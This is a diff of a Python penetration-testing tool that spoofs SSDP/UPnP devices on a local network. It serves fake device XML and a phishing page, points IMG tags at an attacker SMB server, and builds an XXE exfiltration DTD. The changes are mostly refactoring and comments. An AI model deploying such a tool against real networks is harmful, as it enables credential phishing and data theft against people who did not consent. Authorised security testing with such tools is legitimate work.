@@ -8,7 +8,7 @@ from http.server import HTTPServer
 from email.utils import formatdate
 from time import sleep
 from ipaddress import ip_address
-import os,sys,re,argparse,socket,struct,time,re,socketserver,signal;
+import os,sys,re,argparse,socket,struct,time,re,signal;
 
 banner = r'''
 ___________     .__.__    _________ _________________ __________
@@ -18,7 +18,8 @@ ___________     .__.__    _________ _________________ __________
 /_______  / \_/ |__|____/_______  /_______  //_______  /____|
         \/                      \/        \/         \/
 
-...by initstring
+...by initstring (gitlab.com/initstring)
+additional contributions by 
 '''
 
 print(banner)
@@ -30,9 +31,9 @@ class bcolors:
     ORANGE = '\033[93m'
     RED = '\033[91m'
     ENDC = '\033[0m'
-okBox = bcolors.BLUE + '[*] ' + bcolors.ENDC
-noteBox = bcolors.GREEN + '[+] ' + bcolors.ENDC
-warnBox = bcolors.ORANGE + '[!] ' + bcolors.ENDC
+okBox = bcolors.BLUE +      '[*] ' + bcolors.ENDC
+noteBox = bcolors.GREEN +   '[+] ' + bcolors.ENDC
+warnBox = bcolors.ORANGE +  '[!] ' + bcolors.ENDC
 msearchBox = bcolors.BLUE + '[M-SEARCH]     ' + bcolors.ENDC
 xmlBox = bcolors.GREEN +    '[XML REQUEST]  ' + bcolors.ENDC
 phishBox = bcolors.RED +    '[PHISH HOOKED] ' + bcolors.ENDC 
@@ -42,26 +43,22 @@ exfilBox = bcolors.RED +    '[EXFILTRATION] ' + bcolors.ENDC
 # Handle arguments before moving on....
 parser = argparse.ArgumentParser()
 parser.add_argument('interface', type=str, help='Network interface to listen on.', action='store')
-parser.add_argument('-p', '--port', type=str, help='Port for HTTP server. Defaults to 8888.', action='store')
-parser.add_argument('-t', '--template', type=str, help='Name of a folder in the templates directory. \
-                     Defaults to "password-vault". This will determine xml and phishing pages used."', action='store')
+parser.add_argument('-p', '--port', type=str, default=8888, help='Port for HTTP server. Defaults to 8888.'
+                    , action='store')
+parser.add_argument('-t', '--template', type=str, default='password-vault', help='Name of a folder in the templates \
+                     directory. Defaults to "password-vault". This will determine xml and phishing pages used.'
+                     , action='store')
 parser.add_argument('-s', '--smb', type=str, help='IP address of your SMB server. Defalts to the \
                      primary address of the "interface" provided.', action='store')
 args = parser.parse_args()
 
 interface = args.interface
-if args.port:
-    localPort = int(args.port)
-else:
-    localPort = 8888
+localPort = int(args.port)
+templateDir = os.path.dirname(__file__) + '/templates/' + args.template
 
-if args.template:
-    templateDir = os.path.dirname(__file__) + '/templates/' + args.template
-    if not os.path.isdir(templateDir):
-        print(warnBox + "Sorry, that template directory does not exist. Please double-check and try again.")
-        sys.exit()
-else:
-    templateDir = os.path.dirname(__file__) + '/templates/password-vault'
+if not os.path.isdir(templateDir):
+    print(warnBox + "Sorry, that template directory does not exist. Please double-check and try again.")
+    sys.exit()
 
 
 class SSDPListener:
@@ -78,11 +75,9 @@ class SSDPListener:
         ssdpPort = 1900			# This is defined by the SSDP spec, do not change
         mcastGroup='239.255.255.250'	# This is defined by the SSDP spec, do not change
         serverAddress = ('', ssdpPort)
-        knownHosts = []
         
         # Create the socket
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        #self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
         # Bind to the server address
         self.sock.bind(serverAddress)
@@ -219,9 +214,9 @@ def process_data(listener, data, address):
             requestedST = re.findall(r'\\r\\nST:(.*?)\\r\\n', str(data))[0].strip()
         except:
             requestedST = 'ssdp:all'
-        if address[0] not in listener.knownHosts:
+        if (address[0],requestedST) not in listener.knownHosts:
             print(msearchBox + "New Host {}, Service Type: {}".format(remoteIp, requestedST))
-            listener.knownHosts.append(address[0])
+            listener.knownHosts.append((address[0], requestedST))
         send_location(listener, address, requestedST)
 
 def send_location(listener, address, requestedST):
@@ -301,7 +296,7 @@ def serve_html(deviceXML, serviceXML, phishPage, exfilDTD):
     Starts the web server for delivering XML files and the phishing page.
     """
     HTTPClass = MakeHTTPClass(deviceXML, serviceXML, phishPage, exfilDTD)
-    socketserver.TCPServer.allow_reuse_address = True
+    MultiThreadedHTTPServer.allow_reuse_address = True
     descriptor = MultiThreadedHTTPServer((localIp, localPort), HTTPClass)
     descriptor.serve_forever()
 
@@ -332,24 +327,24 @@ def listen_msearch():
 
 def main():
     global localIp
-    localIp = get_ip()
-    smbServer = set_smb()
-    deviceXML = buildDeviceXML(smbServer)
-    serviceXML = buildServiceXML()
-    phishPage = buildPhish(smbServer)
-    exfilDTD = buildExfil()
-    print_details(smbServer)
-    try:
+    localIp = get_ip()                      # Extract IP address of provided interface
+    smbServer = set_smb()                   # Choose which IP we will inject into IMG tags for phishing
+    deviceXML = buildDeviceXML(smbServer)   # Build the primary XML file parsed in all instances
+    serviceXML = buildServiceXML()          # Not yet implemented, may be necessary for advanced future templates
+    phishPage = buildPhish(smbServer)       # Build the phishing page displayed to users who click evil devices
+    exfilDTD = buildExfil()                 # Used in 0-day XXE detection to resolve exfiltration variables
+    print_details(smbServer)                # Provide details of our configuration on the CLI
+    try:                                    # Spawn the web server and SSDP server as separate threads
         webServer = Process(target=serve_html, args=(deviceXML, serviceXML, phishPage, exfilDTD))
         ssdpServer = Process(target=listen_msearch, args=())
         webServer.start()
         ssdpServer.start()
         signal.pause()
-    except (KeyboardInterrupt, SystemExit):
+    except (KeyboardInterrupt, SystemExit): # Allow for a graceful exit when pressing Ctrl-C
         print("\n" + warnBox + "Thanks for playing! Stopping threads and exiting...\n")
         webServer.terminate()
         ssdpServer.terminate()
-        sleep(5)
+        sleep(3)
         sys.exit()
     
 
